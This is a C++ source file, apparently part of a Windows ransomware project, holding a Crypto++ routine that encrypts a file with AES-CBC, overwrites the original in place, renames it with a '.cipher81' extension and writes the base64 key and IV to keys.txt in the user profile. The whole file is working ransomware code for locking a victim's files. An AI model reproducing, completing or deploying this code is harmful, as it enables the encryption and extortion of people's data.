#include "encrypt.hpp"
#include "utils.hpp"
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/osrng.h>
#include <cryptopp/filters.h>
#include <cryptopp/secblock.h>
#include <cryptopp/base64.h>

#include <iostream>
#include <Windows.h>
#include <fstream>
#include "shout.h"
namespace fs = std::filesystem;

CryptoPP::SecByteBlock generateKey()
{
    CryptoPP::SecByteBlock key(CryptoPP::AES::DEFAULT_KEYLENGTH);
    CryptoPP::AutoSeededRandomPool prng;
    prng.GenerateBlock(key, key.size());
    return key;
}

CryptoPP::SecByteBlock generateIv()
{
    CryptoPP::SecByteBlock iv(CryptoPP::AES::BLOCKSIZE);
    CryptoPP::AutoSeededRandomPool prng;
    prng.GenerateBlock(iv, iv.size());
    return iv;
}

void encryptSingleFile(const fs::path& filePath, const CryptoPP::SecByteBlock& generatedKey, const CryptoPP::SecByteBlock& generatedIv)
{
    okay("Start encryptSingleFile for: ") << filePath << "\n";
    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile.is_open())
    {
        warn("Cannot open the file to read: ") << filePath << std::endl;
        return;
    }
    std::vector<char> data((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    // --- Prepare key, IV, and encryptor (AES/CBC) ---
    CryptoPP::SecByteBlock key = generatedKey;
    CryptoPP::SecByteBlock iv = generatedIv;

    CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption encryptor;
    encryptor.SetKeyWithIV(key, key.size(), iv);

    // --- Encryption (catch Crypto++ exceptions) ---
    std::string encrypted;
    try
    {
        CryptoPP::StringSource(
            reinterpret_cast<const byte*>(data.data()),
            data.size(),
            true,
            new CryptoPP::StreamTransformationFilter(
                encryptor,
                new CryptoPP::StringSink(encrypted),
                CryptoPP::StreamTransformationFilter::PKCS_PADDING
            )
        );
    }
    catch (const CryptoPP::Exception& e)
    {
        warn("Crypto++ error while encrypting file ") << filePath << ": " << e.what() << std::endl;
    }

    std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
    if (!outFile.is_open())
    {
        warn("Cannot open file to write: ") << filePath << std::endl;
        return;
    }
    outFile.write(encrypted.data(), encrypted.size());
    outFile.close();

    okay("File encrypted: ") << filePath << std::endl;

    fs::path newFilePath = filePath;
    newFilePath += ".cipher81";
    try
    {
        fs::rename(filePath, newFilePath);
        okay("File encrypted and renamed to: ") << newFilePath << std::endl;
    }
    catch (const fs::filesystem_error& e)
    {
        warn("Error while renaming file: ") << e.what() << std::endl;
    }

    std::string userProfilePath = getUserProfilePath();
    if (userProfilePath.empty()) {
        warn("Failed to get user profile path!") << std::endl;
    }
    std::string userProfile = userProfilePath + "\\keys.txt";

    std::ofstream keys(userProfile);
    if (!keys) {
        warn("Couldn't open keys file\n");
    }

    okay("Work");

    std::string keyBase64;
    CryptoPP::StringSource encryptKey(key, key.size(), true, new CryptoPP::Base64Encoder(
        new CryptoPP::StringSink(keyBase64),
        false
    ));

    std::string ivBase64;
    CryptoPP::StringSource encryptIV(iv, iv.size(), true, new CryptoPP::Base64Encoder(
        new CryptoPP::StringSink(ivBase64),
        false
    ));

    keys << keyBase64 << "\n";
    keys << ivBase64 << "\n";

    info("Finished encryptSingleFile for: ") << filePath << "\n";
}
